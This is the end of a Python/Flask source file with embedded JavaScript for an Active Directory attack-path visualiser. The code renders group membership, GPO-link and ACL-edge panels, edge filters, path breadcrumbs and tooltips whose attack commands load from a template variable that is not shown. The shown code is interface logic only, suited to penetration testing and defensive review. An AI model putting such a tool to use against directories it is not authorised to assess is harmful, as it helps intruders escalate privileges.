  const section = (title, edges, makeRow) => {
    if (!edges.length) return '';
    const key = `${d.id}|${title}`;
    const expanded = !!G.infoExpanded[key];
    const shown = expanded ? edges : edges.slice(0,7);
    const body = shown.map(makeRow).join('');
    const more = edges.length > 7
      ? `<button class="g-edge-more" data-section="${escAttr(key)}" onclick="gToggleInfoSection(this.dataset.section, event)">${expanded ? 'show less' : `+${edges.length-7} more`}</button>`
      : '';
    return `<div class="g-edge-section"><div class="g-edge-title">${escHtml(title)}</div>${body}${more}</div>`;
  };

  if (d.bucket) {
    rows.push(['Aggregated', `${d.bucketCount} ${d.bucketType}${d.bucketCount===1?'':'s'}`, '']);
    rows.push(['Located in', nodeName(d.bucketSource), '']);
    document.getElementById('gIBody').innerHTML=rows.map(([l,v,c])=>
      `<div class="g-info-row"><span style="color:var(--dim2)">${escHtml(l)}</span><span class="ip-val ${c}">${v}</span></div>`
    ).join('') + startAction;
    const items = d.bucketItems || [];
    const key = `${d.id}|Aggregated objects`;
    const expanded = !!G.infoExpanded[key];
    const shownItems = expanded ? items : items.slice(0,12);
    const body = shownItems.map(id => `<div class="g-edge-row clickable" data-goto="${escAttr(id)}" onclick="gFocusNode(this.dataset.goto, event)">
      <span class="g-badge" style="background:#53606a18;color:#8aa4b8;border:1px solid #8aa4b833">${escHtml(nodeType(id) || d.bucketType)}</span>
      <span class="g-edge-name" title="${nodeName(id)}">${nodeName(id)}</span>
    </div>`).join('');
    const more = items.length > 12
      ? `<button class="g-edge-more" data-section="${escAttr(key)}" onclick="gToggleInfoSection(this.dataset.section, event)">${expanded ? 'show less' : `+${items.length-12} more`}</button>`
      : '';
    document.getElementById('gIEdges').innerHTML =
      `<div class="g-edge-section"><div class="g-edge-title">Aggregated objects</div>${body}${more}</div>`;
    document.getElementById('gInfo').classList.remove('hidden');
    return;
  }

  const contains = outL.filter(l => l.right === 'Contains');
  const containedBy = inL.filter(l => l.right === 'Contains');
  const linkedTo = outL.filter(l => l.right === 'GpLink');
  const linkedGpos = inL.filter(l => l.right === 'GpLink');
  const memberOf = outL.filter(l => l.right === 'MemberOf');
  const members = inL.filter(l => l.right === 'MemberOf');
  const aclOut = outL.filter(l => !l.structural && l.right !== 'MemberOf');
  const aclIn = inL.filter(l => !l.structural && l.right !== 'MemberOf');

  if (containedBy.length) rows.push(['Located in', nodeName(containedBy[0].source), '']);
  if (contains.length) rows.push(['Contains', `${contains.length} object${contains.length===1?'':'s'}`, '']);
  if (linkedGpos.length) rows.push(['Linked GPOs', `${linkedGpos.length}`, '']);
  if (linkedTo.length) rows.push(['Linked targets', `${linkedTo.length}`, '']);
  if (memberOf.length) rows.push(['Member of', `${memberOf.length} group${memberOf.length===1?'':'s'}`, '']);
  if (members.length) rows.push(['Members', `${members.length} object${members.length===1?'':'s'}`, '']);
  if (aclOut.length || aclIn.length) rows.push(['ACL edges', `${aclOut.length} out / ${aclIn.length} in`, '']);
  else rows.push(['ACL edges', 'None in loaded data', '']);

  document.getElementById('gIBody').innerHTML=rows.map(([l,v,c])=>
    `<div class="g-info-row"><span style="color:var(--dim2)">${escHtml(l)}</span><span class="ip-val ${c}">${v}</span></div>`
  ).join('') + startAction;

  const html = [
    section('Contains', contains, l => edgeRow(l, l.target)),
    section('Contained by', containedBy, l => edgeRow(l, l.source)),
    section('Linked GPO targets', linkedTo, l => edgeRow(l, l.target, l.enforced ? 'enforced' : nodeType(l.target))),
    section('Linked GPOs', linkedGpos, l => edgeRow(l, l.source, l.enforced ? 'enforced' : nodeType(l.source))),
    section('Member of', memberOf, l => edgeRow(l, l.target)),
    section('Members', members, l => edgeRow(l, l.source)),
    section('Rights from this object', aclOut, l => edgeRow(l, l.target)),
    section('Rights targeting this object', aclIn, l => edgeRow(l, l.source)),
  ].filter(Boolean).join('');

  document.getElementById('gIEdges').innerHTML = html || '<div class="g-edge-empty">No visible relationships in the current graph view</div>';

  document.getElementById('gInfo').classList.remove('hidden');
}

function showGPathBar(path) {
  if (!path.chain) return;
  let html='';
  path.chain.forEach((step,i)=>{
    html+=`<span class="g-pn">${step.name.split('@')[0]}</span>`;
    if(i<path.chain.length-1&&path.chain[i+1].right){
      const next = path.chain[i+1];
      if (next.via) {
        html+=`<span class="g-pr">MemberOf</span><span class="g-pa">→</span><span class="g-pn">${next.via.split('@')[0]}</span><span class="g-pr">${next.right}</span><span class="g-pa">→</span>`;
      } else {
        html+=`<span class="g-pr">${next.right}</span><span class="g-pa">→</span>`;
      }
    }
  });
  document.getElementById('gPChain').innerHTML=html;
  document.getElementById('gPathBar').style.display='block';
}

function gSetMode(mode) {
  G.mode = mode;
  hideEdgeTip();
  // Don't reset G.initialized — keep the SVG/zoom/intervals alive, just redraw nodes
  gSyncToolbarState();
  if (!G.svg) {
    renderGraphTab();
  } else {
    const { nodes, links } = buildGraphData();
    const container = document.getElementById('graphView');
    drawGraph(nodes, links, container);
  }
}

function gSetEdgeLayer(layer) {
  G.edgeLayer = layer;
  hideEdgeTip();
  gSyncToolbarState();
  if (!G.svg) {
    renderGraphTab();
  } else {
    const { nodes, links } = buildGraphData();
    const container = document.getElementById('graphView');
    drawGraph(nodes, links, container);
  }
}

function gToggleEdgeFilterPanel() {
  G.filterPanelOpen = !G.filterPanelOpen;
  gSyncEdgeFilterState();
}

function gSyncEdgeFilterState() {
  const panel = document.getElementById('gFilterPanel');
  const toggle = document.getElementById('gFilterToggle');
  if (panel) panel.classList.toggle('hidden', !G.filterPanelOpen);
  if (toggle) {
    toggle.classList.toggle('active', G.filterPanelOpen || gEdgeFiltersChanged());
    toggle.textContent = gEdgeFiltersChanged() ? 'Filters active' : 'Edge filters';
  }
  const filters = gEdgeFilters();
  G_FILTER_DEFS.forEach(f => {
    const btn = document.getElementById(`gFilt_${f.key}`);
    if (btn) btn.classList.toggle('active', filters[f.key] !== false);
  });
}

function gToggleEdgeFilter(key) {
  const filters = gEdgeFilters();
  filters[key] = filters[key] === false;
  hideEdgeTip();
  gSyncEdgeFilterState();
  if (G.svg) {
    const { nodes, links } = buildGraphData();
    const container = document.getElementById('graphView');
    drawGraph(nodes, links, container);
  }
}

function gResetEdgeFilters() {
  G.edgeFilters = gEdgeFilterDefaults();
  hideEdgeTip();
  gSyncEdgeFilterState();
  if (G.svg) {
    const { nodes, links } = buildGraphData();
    const container = document.getElementById('graphView');
    drawGraph(nodes, links, container);
  }
}

function gZoomBy(k){if(G.svg&&G.zoom)G.svg.transition().duration(260).call(G.zoom.scaleBy,k);}
function gZoomFit(){
  const c=document.getElementById('graphView');
  if(G.svg&&G.zoom) G.svg.transition().duration(460).call(G.zoom.transform,
    d3.zoomIdentity.translate((c.clientWidth||800)/2,(c.clientHeight||600)/2).scale(.75));
}

// ── end graph tab ────────────────────────────────────────────────────────────

// ── EDGE TOOLTIP ─────────────────────────────────────────────────────────────
let edgeTipVisible = false;
let edgeTipTimer   = null;
let edgeTipPinned  = false; // true when mouse is over the tooltip itself

function restorePinnedEdgeVisual() {
  if (!G.edgeTipKey) return;
  G.linkPaths.filter(l => l._key === G.edgeTipKey)
    .attr('stroke-width', l => gLinkTouchesActive(l) ? 2.6 : 1.2)
    .attr('stroke-opacity', l => gLinkTouchesActive(l) ? .93 : .05);
  if (G.linkArrows) {
    G.linkArrows.filter(l => l._key === G.edgeTipKey)
      .attr('fill-opacity', l => gLinkTouchesActive(l) ? .92 : .18);
  }
}

function showEdgeTip(e, link) {
  if (edgeTipTimer) { clearTimeout(edgeTipTimer); edgeTipTimer = null; }
  G.edgeTipKey = link._key;

  const right = link.right;
  const tip   = document.getElementById('edgeTip');
  const etR   = document.getElementById('etRight');
  const etB   = document.getElementById('etBody');

  // Color badge
  const c = G_SEV_COLOR[link.sev] || '#5a8090';
  etR.textContent = right;
  etR.style.cssText = `background:${c}18;color:${c};border:1px solid ${c}44;font-weight:bold;font-size:.68em;letter-spacing:.5px;padding:2px 8px;border-radius:3px`;

  // Build tip content
  const raw = G_EDGE_TIPS[right] || null;
  if (raw) {
    etB.innerHTML = formatEdgeTip(raw);
  } else {
    etB.innerHTML = `<span style="color:var(--dim2)">${right} — ${link.source.label||link.source.id} → ${link.target.label||link.target.id}</span>`;
  }

  // Position near cursor
  const px = e.clientX + 16;
  const py = e.clientY - 10;
  tip.style.left = Math.min(px, window.innerWidth  - 360) + 'px';
  tip.style.top  = Math.min(py, window.innerHeight - 300) + 'px';
  tip.classList.add('show');
  edgeTipVisible = true;
  edgeTipPinned  = false;
}

function scheduleHideEdgeTip() {
  // 350ms delay — enough time to move mouse from edge to tooltip
  edgeTipTimer = setTimeout(() => {
    if (!edgeTipPinned) hideEdgeTip();
    edgeTipTimer = null;
  }, 350);
}

function hideEdgeTip() {
  restorePinnedEdgeVisual();
  const tip = document.getElementById('edgeTip');
  if (tip) tip.classList.remove('show');
  edgeTipVisible = false;
  edgeTipPinned  = false;
  G.edgeTipKey = null;
}

function formatEdgeTip(raw) {
  const srcMatch = raw.match(/SOURCE:\s*(https?:\/\/\S+)/);
  const srcUrl   = srcMatch ? srcMatch[1] : null;
  let body = srcUrl ? raw.replace(/SOURCE:\s*https?:\/\/\S+/, '').trim() : raw.trim();

  const lines = body.split('\n');
  let html = '';
  let codeLines = [];
  let commentLines = [];

  function flushCode() {
    if (!codeLines.length) return;
    const id  = 'et_' + Math.random().toString(36).slice(2,8);
    const rendered = codeLines.map(l => fillTip(l)).join('\n');
    html += `<div class="et-block">
      <button class="et-block-copy" onclick="copyBlock('${id}')">⎘</button>
      <pre id="${id}">${rendered}</pre>
    </div>`;
    codeLines = [];
  }
  function flushComment() {
    if (!commentLines.length) return;
    const txt = commentLines.join(' ').trim();
    if (txt) html += `<div class="et-comment">${escHtml(txt)}</div>`;
    commentLines = [];
  }

  for (const line of lines) {
    const t = line.trim();
    if (!t) { flushCode(); flushComment(); continue; }
    if (t.startsWith('===')) {
      flushCode(); flushComment();
      html += `<span class="edge-tip-label">${escHtml(t.replace(/===/g,'').trim())}</span>`;
    } else if (t.startsWith('# ') || t.startsWith('// ')) {
      flushCode();
      commentLines.push(t);
    } else {
      flushComment();
      codeLines.push(line);
      if (!t.endsWith('\\')) flushCode();
    }
  }
  flushCode(); flushComment();

  if (srcUrl) {
    html += `<div class="edge-tip-src">📎 <a href="${escHtml(srcUrl)}" target="_blank">${escHtml(srcUrl)}</a></div>`;
  }
  return html;
}

function copyBlock(id) {
  const pre = document.getElementById(id);
  if (!pre) return;
  const text = pre.innerText || pre.textContent;
  navigator.clipboard.writeText(text).then(() => {
    // Find the copy btn for this block
    const btn = pre.parentElement.querySelector('.et-block-copy');
    if (!btn) return;
    const orig = btn.textContent;
    btn.textContent = '✓';
    btn.style.borderColor = 'var(--green)';
    btn.style.color = 'var(--green)';
    setTimeout(() => {
      btn.textContent = orig;
      btn.style.borderColor = '';
      btn.style.color = '';
    }, 1600);
  }).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = pre.innerText;
    ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  });
}

// Edge tips come from Python ATTACK_TIPS; keep the commands in one source.
const G_EDGE_TIPS = {{ attack_tips | tojson }};

function showLoading(msg) {
  document.getElementById('content').innerHTML = `<div class="loading"><div class="spinner"></div>${msg}</div>`;
}</script>
</body>
</html>
"""


if __name__ == '__main__':
    print("""
+------------------------------------------------------+
|  BLOODBOBER v1.4.4 -- Attack Path Analyzer  🦫        |
|  http://localhost:5000                               |
|  Ctrl+C -> stop                                  |
+------------------------------------------------------+
""")
    # Try waitress for cleaner output, fall back to Flask dev server
    try:
        from waitress import serve
        print("  [waitress] Production WSGI server starting...")
        serve(app, host='0.0.0.0', port=5000, threads=4)
    except ImportError:
        app.run(debug=False, host='0.0.0.0', port=5000, use_reloader=False)
